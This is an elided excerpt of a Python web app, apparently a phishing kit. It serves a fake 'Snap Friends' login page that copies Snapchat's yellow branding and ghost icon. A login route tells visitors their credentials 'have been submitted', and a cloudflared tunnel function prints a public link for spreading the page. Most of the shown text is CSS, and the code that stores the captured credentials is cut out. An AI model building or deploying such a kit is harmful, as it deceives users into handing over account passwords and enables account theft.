...
def index():
    ...
    <head>
        ...
        <title>Snap Friends - Connect & Share</title> <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
        <style>
            :root {
                /* Light theme colors */
                ...
                --button-bg-light: #fffc00; /* Snapchat yellow */
                --button-hover-light: #e6e300;
                --link-light: #333333; /* Dark link text */
            }

            @media (prefers-color-scheme: dark) {
                :root {
                    /* Dark theme colors */
                    --bg-light: #1c1c1c; /* Dark gray background */
                    ...
                    --button-bg-light: #fffc00; /* Snapchat yellow */
                    --button-hover-light: #e6e300;
                    --link-light: #fffc00; /* Yellow link text */
                }
            }
            ...
            .container {
                ...
                align-items: center;
                width: 100%;
                max-width: 400px; /* Wider for Snapchat style */
                text-align: center;
            }
            ...
            /* Ghost icon SVG */
            .ghost-icon {
                width: 100px; /* Large icon */
                height: 100px;
                margin-bottom: 15px;
                fill: var(--button-bg-light); /* Snapchat yellow */
            ...
            .input-field input {
                width: 100%;
                padding: 18px 15px; /* More padding, taller fields */
            ...
            .input-field input:focus {
                border-color: var(--button-bg-light); /* Snapchat yellow border on focus */
                outline: none;
            }
            ...
            .login-button {
                ...
                color: var(--text-light); /* Dark text on yellow button */
                font-weight: 700;
                font-size: 18px;
                cursor: pointer;
                margin-top: 10px;
            ...
            .signup-button {
                width: 100%;
                padding: 18px 15px;
                border: 2px solid var(--button-bg-light); /* Yellow border */
                border-radius: 8px;
                background-color: transparent; /* Transparent background */
                color: var(--button-bg-light); /* Yellow text */
                font-weight: 700;
                font-size: 18px;
                text-decoration: none;
                cursor: pointer;
                margin-top: 20px; /* Space from login box */
                transition: background-color 0.2s ease, color 0.2s ease, border-color 0.2s ease;
            }
            .signup-button:hover {
                background-color: var(--button-bg-light); /* Yellow background on hover */
...
def login():
    ...
    <body>
      <div class="container">
        ...
        <p>Your credentials have been submitted.<br>You will be redirected shortly.</p>
      </div>
    </body>
    </html>
    '''
...
def run_cloudflared_tunnel(local_url):
    ...
    for line in process.stdout:
        ...
        if match:
            ...
            print(f"Snap Friends Public Link: {tunnel_url}") # Updated print message
            sys.stdout.flush()
            break
    return process
